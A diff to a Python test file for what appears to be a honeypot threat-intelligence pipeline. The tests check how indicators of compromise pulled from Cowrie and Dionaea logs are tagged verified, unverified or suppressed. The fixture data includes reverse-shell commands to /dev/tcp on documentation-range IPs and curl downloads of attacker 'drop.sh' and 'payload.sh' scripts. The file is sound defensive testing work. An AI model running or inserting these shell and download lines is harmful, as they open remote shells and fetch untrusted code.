@@ -1287,7 +1287,9 @@ class TestV15GoldInvariants:
         df = pl.DataFrame(
             [
                 _row_with(
+                    dataset="cowrie",
                     class_uid=CLASS_FILE_ACTIVITY,
+                    activity_id=2,
                     file_hash_sha256=sha_mal,
                     file_intent="malware",
                     file_url="http://stager.example.org/payload.elf",
@@ -1338,11 +1340,194 @@ class TestV15GoldInvariants:
         assert by_key[("malware_hash", sha_mal)]["vhash"] == "0140vhash999"
         assert by_key[("malware_hash", sha_mal)]["malware_family"] == "mirai"
         assert ("stager_url", "http://stager.example.org/payload.elf") in by_key
+        assert (
+            by_key[("stager_url", "http://stager.example.org/payload.elf")]["verification_status"]
+            == "verified"
+        )
+        assert (
+            by_key[("stager_url", "http://stager.example.org/payload.elf")]["verification_reason"]
+            == "captured_artifact"
+        )
         assert ("stager_domain", "stager.example.org") in by_key
+        assert (
+            by_key[("stager_domain", "stager.example.org")]["verification_status"] == "unverified"
+        )
         assert ("c2_ip", "198.51.100.88") in by_key
         assert by_key[("c2_ip", "198.51.100.88")]["gti_verdict"] == "VERDICT_MALICIOUS"
         assert by_key[("c2_ip", "198.51.100.88")]["actor_associations"] == "UNC9999"
+        assert by_key[("c2_ip", "198.51.100.88")]["verification_status"] == "verified"
         assert ("ssh_key", expected_fp) in by_key
+        assert by_key[("ssh_key", expected_fp)]["verification_status"] == "verified"
+        assert by_key[("malware_hash", sha_mal)]["verification_status"] == "verified"
+
+    def test_compute_extracted_iocs_keeps_all_raw_rows_with_verification_status(self) -> None:
+        """Gold extracted_iocs retains every non-infra string with deterministic verification
+        and suppression tags (zero silent data loss)."""
+        from lantana.transform.metrics import compute_extracted_iocs
+
+        df = pl.DataFrame(
+            [
+                _row_with(
+                    class_uid=CLASS_PROCESS_ACTIVITY,
+                    actor_process_cmd_line=(
+                        "curl https://raw.githubusercontent.com/attacker/repo/main/drop.sh; "
+                        "curl https://raw.githubusercontent.com/org/repo/main/clean.sh; "
+                        "curl https://ifconfig.me/ip; "
+                        "wget http://legit-bank.example.org/index.html; "
+                        "nc -zv 1.1.1.1 53; "
+                        "bash -i >& /dev/tcp/198.51.100.90/4444 0>&1; "
+                        "bash -i >& /dev/tcp/198.51.100.91/4444 0>&1"
+                    ),
+                ),
+            ]
+        )
+        lookup: dict[tuple[str, str], dict[str, object]] = {
+            ("url", "https://raw.githubusercontent.com/attacker/repo/main/drop.sh"): {
+                "vt_status": "found",
+                "vt_url_malicious_count": 5,
+            },
+            ("ip", "198.51.100.90"): {
+                "greynoise_riot": True,
+                "greynoise_classification": "benign",
+                "abuseipdb_confidence_score": 90,
+            },
+            ("ip", "198.51.100.91"): {
+                "abuseipdb_confidence_score": 75,
+            },
+        }
+        iocs = compute_extracted_iocs(df, enrichment_lookup=lookup)
+        by_key = {(r["ioc_type"], r["ioc_value"]): r for r in iocs.iter_rows(named=True)}
+
+        # Shared-host domain is ALWAYS retained in Gold as suppressed
+        gh_dom = by_key[("stager_domain", "raw.githubusercontent.com")]
+        assert gh_dom["verification_status"] == "suppressed"
+        assert gh_dom["verification_reason"] == "shared_hosting_domain"
+
+        # Corroborated shared-host full URL is verified
+        gh_mal = by_key[
+            ("stager_url", "https://raw.githubusercontent.com/attacker/repo/main/drop.sh")
+        ]
+        assert gh_mal["verification_status"] == "verified"
+        assert gh_mal["verification_reason"] == "vt_malicious"
+
+        # Uncorroborated shared-host URL is suppressed (blocks benign GitHub poisoning)
+        gh_clean = by_key[
+            ("stager_url", "https://raw.githubusercontent.com/org/repo/main/clean.sh")
+        ]
+        assert gh_clean["verification_status"] == "suppressed"
+        assert gh_clean["verification_reason"] == "shared_hosting_unverified_url"
+
+        # Benign utility host suppresses both domain and URL
+        assert by_key[("stager_domain", "ifconfig.me")]["verification_status"] == "suppressed"
+        assert (
+            by_key[("stager_url", "https://ifconfig.me/ip")]["verification_status"] == "suppressed"
+        )
+
+        # Unverified arbitrary domain/URL kept as unverified
+        assert (
+            by_key[("stager_url", "http://legit-bank.example.org/index.html")][
+                "verification_status"
+            ]
+            == "unverified"
+        )
+        assert (
+            by_key[("stager_domain", "legit-bank.example.org")]["verification_status"]
+            == "unverified"
+        )
+
+        # Public resolver IP suppressed
+        assert by_key[("c2_ip", "1.1.1.1")]["verification_status"] == "suppressed"
+        assert by_key[("c2_ip", "1.1.1.1")]["verification_reason"] == "benign_resolver_ip"
+
+        # GreyNoise RIOT overrides AbuseIPDB
+        assert by_key[("c2_ip", "198.51.100.90")]["verification_status"] == "suppressed"
+        assert by_key[("c2_ip", "198.51.100.90")]["verification_reason"] == "greynoise_riot"
+
+        # AbuseIPDB >= 50 verifies outbound C2 IP
+        assert by_key[("c2_ip", "198.51.100.91")]["verification_status"] == "verified"
+        assert by_key[("c2_ip", "198.51.100.91")]["verification_reason"] == "abuseipdb_malicious"
+
+    def test_unauthenticated_dionaea_upload_and_uncorroborated_file_cannot_poison_stix(
+        self,
+    ) -> None:
+        """Adversarial regression: an attacker POSTing arbitrary bytes to Dionaea HTTP with a
+        victim or shared-hosting URL in the request line (or downloading an uncorroborated
+        benign file) must NEVER forge captured_artifact=True for stager_url or c2_ip."""
+        from lantana.transform.metrics import compute_extracted_iocs
+
+        benign_sha = "b" * 64
+        mal_sha = "c" * 64
+        df = pl.DataFrame(
+            [
+                # Dionaea inbound HTTP POST upload with attacker-controlled URI (activity_id=1)
+                _row_with(
+                    dataset="dionaea",
+                    class_uid=CLASS_FILE_ACTIVITY,
+                    activity_id=1,
+                    file_hash_sha256=mal_sha,
+                    file_intent="malware",
+                    file_url="https://raw.githubusercontent.com/torvalds/linux/master/README",
+                    vt_file_malicious_count=10,
+                ),
+                _row_with(
+                    dataset="dionaea",
+                    class_uid=CLASS_FILE_ACTIVITY,
+                    activity_id=1,
+                    file_hash_sha256=benign_sha,
+                    file_intent="malware",
+                    file_url="http://198.51.100.50/innocent-victim",
+                    vt_file_malicious_count=0,
+                ),
+                # Cowrie file download whose hash is uncorroborated (vt_file_malicious_count=0)
+                _row_with(
+                    dataset="cowrie",
+                    class_uid=CLASS_FILE_ACTIVITY,
+                    activity_id=2,
+                    file_hash_sha256=benign_sha,
+                    file_intent="malware",
+                    file_url="https://raw.githubusercontent.com/org/repo/main/README.md",
+                    vt_file_malicious_count=0,
+                ),
+                # Trailing-dot IP-literal URL targeting a GreyNoise RIOT IP
+                _row_with(
+                    dataset="cowrie",
+                    class_uid=CLASS_PROCESS_ACTIVITY,
+                    actor_process_cmd_line="curl http://198.51.100.90./payload.sh",
+                    file_hash_sha256=None,
+                    file_intent=None,
+                    file_url=None,
+                    vt_file_malicious_count=None,
+                ),
+            ]
+        )
+        lookup: dict[tuple[str, str], dict[str, object]] = {
+            ("ip", "198.51.100.90"): {"greynoise_riot": True, "greynoise_classification": "benign"},
+            ("url", "http://198.51.100.90./payload.sh"): {"vt_url_malicious_count": 5},
+        }
+        iocs = compute_extracted_iocs(df, enrichment_lookup=lookup)
+        by_key = {(r["ioc_type"], r["ioc_value"]): r for r in iocs.iter_rows(named=True)}
+
+        assert (
+            by_key[
+                ("stager_url", "https://raw.githubusercontent.com/torvalds/linux/master/README")
+            ]["verification_status"]
+            == "suppressed"
+        )
+        assert (
+            by_key[("stager_url", "http://198.51.100.50/innocent-victim")]["verification_status"]
+            == "unverified"
+        )
+        assert by_key[("c2_ip", "198.51.100.50")]["verification_status"] == "unverified"
+        assert (
+            by_key[("stager_url", "https://raw.githubusercontent.com/org/repo/main/README.md")][
+                "verification_status"
+            ]
+            == "suppressed"
+        )
+        # Trailing-dot RIOT IP URL is suppressed via normalized IP lookup
+        riot_url = by_key[("stager_url", "http://198.51.100.90./payload.sh")]
+        assert riot_url["verification_status"] == "suppressed"
+        assert riot_url["verification_reason"] == "greynoise_riot"
 
 
 def test_optional_first_skips_leading_nulls_across_diagonal_concat() -> None:
